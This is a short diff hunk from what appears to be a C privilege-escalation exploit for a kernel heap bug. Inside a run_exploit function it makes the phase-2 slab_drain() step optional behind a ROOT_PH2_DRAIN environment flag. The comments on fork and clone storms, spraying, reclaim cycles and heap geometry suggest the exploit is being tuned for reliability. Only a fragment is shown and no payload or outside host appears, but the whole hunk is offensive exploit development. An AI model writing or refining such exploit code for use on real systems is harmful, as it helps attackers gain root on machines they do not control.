@@ -1377,7 +1377,13 @@ int run_exploit(int argc, char **argv) {
         unsetenv("MODE4_SLIDE_VERIFY");
         setenv("MODE4_SLIDE_SWAP", "1", 1);
         usleep(200000);
-        slab_drain();
+        /*
+         * Phase-2 drain: default LIGHT — the phase-1 fork storm already
+         * ran at lower uptime; a second storm at uptime+4min matches the
+         * R1 death pattern. do_one_write's own spray carries fresh clone
+         * storms + reclaim cycles. ROOT_PH2_DRAIN=1 restores full drain.
+         */
+        if (env_flag("ROOT_PH2_DRAIN", 0)) slab_drain();
         /*
          * Heap geometry must replicate SS1/SV1 exactly: parent=P0(boot_id
          * uuid buffer)-8 (harmless string scratch). The REAL write
